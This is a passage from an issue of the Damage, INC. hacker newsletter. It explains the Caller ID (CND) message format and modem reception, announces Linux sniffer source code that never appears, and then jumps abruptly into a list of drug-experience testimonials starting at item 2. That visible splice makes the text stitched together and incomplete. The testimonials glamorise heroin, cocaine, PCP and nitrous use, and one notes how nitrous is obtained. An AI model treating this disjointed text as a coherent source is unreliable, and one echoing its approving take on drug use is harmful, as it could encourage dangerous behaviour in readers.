indicates that the message was correctly received.  Message
retransmission is not supported.

EXAMPLE CND SINGLE DATA MESSAGE

An example of a received CND message, beginning with the message
type word, follows:

04 12 30 39 33 30 31 32 32 34 36 30 39 35 35 35 31 32 31 32 51

04h=	Calling number delivery information code (message type word)
12h= 18 decimal; Number of data words (date,time, and directory
	number words)
ASCII 30,39= 09; September
ASCII 33,30= 30; 30th day
ASCII 31,32= 12; 12:00 PM
ASCII 32,34= 24; 24 minutes (i.e., 12:24 PM)
ASCII 36,30,39,35,35,35,31,32,31,32= (609) 555-1212; calling
			  party's directory number
51h=	Checksum Word

DATA ACCESS ARRANGEMENT (DAA) REQUIREMENTS

To receive CND information, the modem monitors the phone line between
the first and second ring bursts without causing the DAA to go off
hook in the conventional sense, which would inhibit the transmission
of CND by the local central office.  A simple modification to an
existing DAA circuit easily accomplishes the task.

(I will mail the Rockwell data sheet, which includes the suggested
schematic diagram.)

MODEM REQUIREMENTS

Although the data signalling interface parameters match those of a
Bell 202 modem, the receiving CPE need not be a Bell 202 modem.  A
V.23 1200 bps modem receiver may be used to demodulate the Bell 202
signal.  The ring indicate bit (RI) may be used on a modem to indicate
when to monitor the phone line for CND information.  After the RI bit
sets, indicating the first ring burst, the host waits for the RI bit
to reset.  The host then configures the modem to monitor the phone
line for CND information.

(I'm skipping some Rockwell-specific information here.)

According to Bellcore specifications, CND signalling starts as early
as 300 mS after the first ring burst and ends at least 475 mS before
the second ring burst.

APPLICATIONS
Modem manufacturers will soon be implementing new modem features
based on CND information as this service becomes widely
available.

Once CND information is received the user may process the
information in a number of ways.

1.	The date, time, and calling party's directory number can be
	displayed.

2.	Using a look-up table, the calling party's directory number
	can be correlated with his or her name and the name
	displayed.

3.	CND information can also be used in additional ways such as
	for:

	a.  Bulletin board applications
	b.  Black-listing applications
	c.  Keeping logs of system user calls, or
	d.  Implementing a telemarketing data base

Linux Sniffer source code:

In the spotlight this month we're featuring a Linux Sniffer.  As you can see,
it's not by Damage, INC.  <sniff...sniff> but hopefully in future issues there
will be more source code that was written by us.  The source hasn't been
modified in any way, nor are we taking credit for this sniffer.  We're simply
including it so that you can use it, study the code and learn from it.  ;)  If
you want some other sniffers, then check out some web sites that carry them.

    2. L.S.D
       Names:  LSD, hits, acid, blotter, burgers, paper, trips, candy.
       "It was the first time I had done acid.  Looking back, this shit was
       definitely the cleanest and purest stuff I've ever done.  A friend and
       I took one hit each.  There were cartoon characters on the back of the
       hits.  After half an hour I was rushing from head to toe.  Two hours
       later I was so fucked I couldn't remember my own name.  I do
       remember playing with the kitchen knife, wanting to see my own blood.
       The comedown was also one of the best I have ever experienced.  We
       talked about life, and philosophy.  My mind was very expanded at that
       moment.  I felt a peace and calmness within me that I have only
       experienced two other times; but that's another story."

    3. HEROIN
       Names:  Heroin, junk, smack, dope,
       "They said the heroin rush was better than an orgasm.  I just had to
       know for myself.  The thought of using a hypodermic needle kinda
       scared me, but I had snorted coke before, so was not too scared to do
       a little heroin.  A few seconds after I plunged the warm liquid into
       my bloodstream I felt a wave of ecstasy explode in my body.  I was in
       heaven.  Nothing mattered on junk.  Bliss had been attained, why strive
       for anything else?  I enjoyed my experience with heroin.  I don't think
       I'll ever do it again.  I liked it too much, I would probably end up
       a junkie dying of AIDS or something."

    4. MDMA
       Names:  MDMA, ecstasy, 'e', adam, eve, xtc.
       "I prefer to do E at raves personally.  It's just a much better
       atmosphere for the drug.  E keeps me going all night, which is nice.
       It never fucks me up too much, which is also nice.  I can still talk
       to people and make sense.  That's one of the reasons I do E at raves.
       There is a vibe of friendliness, openness and love.  E makes me feel
       alright about the world.  I like the connected feeling I get when I
       do E."

    5. COCAINE
       Names:  Cocaine, coke, cola, white god, blow.
       "The first time I did coke I snorted it.  We had gotten it from a
       reliable source, so I didn't hesitate.  I rolled up a crisp new twenty
       and inserted one end into my nostril.  I covered the other nostril and
       snorted the first rail.  I switched nostrils and snorted back the
       second line.  I immediately felt a rush of exhiliration pulse through
       my body.  My heart was racing, and I felt invincible.  I lit a
       cigarette and took a few puffs.  At this point I heard a ringing in my
       ears.  It got progressively louder until I felt like a locomotion was
       thundering through my head.  Coke is fucking crazy like that.  Its
       as if you're on the edge of the world, looking out into the abyss."

    6. PCP
       Names:  PCP, Angel Dust.
       "I've heard crazy things about PCP; things like people cutting their
       own limbs off, or killing their wife and filleting her.  Still, that
       did not deter me from saying yes when my friend came back saying 'no
       acid, but I got PCP'.  My friend snorted his.  I ate a bit, and laced
       the rest in a joint with weed.  I didn't get as fucked up as I expected
       but nevertheless, things were pretty wierd.  Fortunately I still have
       two arms and two legs. ;) I doubt I'll do PCP again."

    7. DMT
       Names:  DMT.  Method of ingestion: Inhalation of DMT vapours.
       "...Suddenly everything melts away.  I am left floating in nothingness.
       In front of me little sets of eyes pop out of the darkness.  These
       are followed by distorted voices, communicating some unknown language.
       Images of alternate beings flood my vision.  Colors spew out from
       geometric shapes twisting and morphing into a million different
       structures.  I feel myself being pulled forward, through the
       magnificent hallucinations that bombard my reality.  I have arrived on
       another planet.  I have travelled the universe in my mind."

    8. PEYOTE
       Names:  Peyote, cactus.
       "Doing peyote was inevitable for me.  I had been studying native
       Mexican culture for many years, and knew a lot about the ancient
       rituals involving the sacred cactus.  The cactus was mashed up and
       mixed into a brew with many other natural plants, which help smooth
       the trip, and lessen negative somatic effects.  It was the perfect
       set and setting for the trip.  I sat around the fire and discussed
       anthropology with my acquaintances.  The stars danced in the clear
       night sky.  It was a very pleasurable experience, except for the mild
       nausea I felt while digesting the mixture."

    9. NITROUS OXIDE
       Names:  Nitrous oxide, laughing gas, n2o, whippets.
       "Nitrous is for kicks.  It totally knocks you in the ass if you take
       some while peaking out on another drug.  Sometimes people will sell
       in balloons, but most of the time you either use whipped cream
       canisters, or buy it in a tank.  Its more of a kid's drug, but it's
       fun every now and then... if you want to have a 2-minute high."

   10. PSILOCYBIN
       Names:  Psilocybin, mushrooms, shrooms, mushies.
       "I've done shrooms quite a few times, and one thing I can say is that
       the effects were always different.  At first I used to get major
       aural distortions and hallucinations, combined with spontaneous
       laughing.  Other times I'd be really happy, and body-buzzed.  But the
       most incredible experience I ever had was on three and a half grams of
       the dried mushroom.  While peaking my friend and I attained the
       level of consciousness that is usually reserved only for meditating
       buddhas.  I felt very calm, and at one with the universe."

CLOSING COMMENTS -                                                {CLOSING}
Shatazar's Inaugural Closing Comments:

I have been given the honour of closing another quality issue of the
Damage, INC. Newsletter.  As always, it is our intent to provide our readers
with interesting and useful information that the mass media will not.  The
quote for this issue, "We keep you honest" is what we have been doing since
the beginning.  ;-)  We work hard to make sure that all the information we
present to you is accurate and truthful.  As we have stated many times, it is up
to you to form your own opinions.  By the way, thinking to yourself "I disagree"
or "I don't believe it" doesn't benefit anyone, including yourself.  That is
because the truth is not revealed by such thoughts.  They must be acted upon.

Do your own research and report your findings to us.  That is why the REPORTS
FROM THE FRONT section of the Damage, INC. Newsletter exists.  Also, while
searching for the truth, if you discover something of great interest send the
information to us.  If it is quality, we'll be pleased to share it with the rest
of our loyal readers.  That way everyone is thinking and striving to eliminate
the fog of misinformation that Big Brother and the mass media creates on a daily
basis.

We're always looking for Writers, Members and Distribution Sites.  If you'd like
to apply to Damage, INC. and join a respected h/p group, then download a copy of
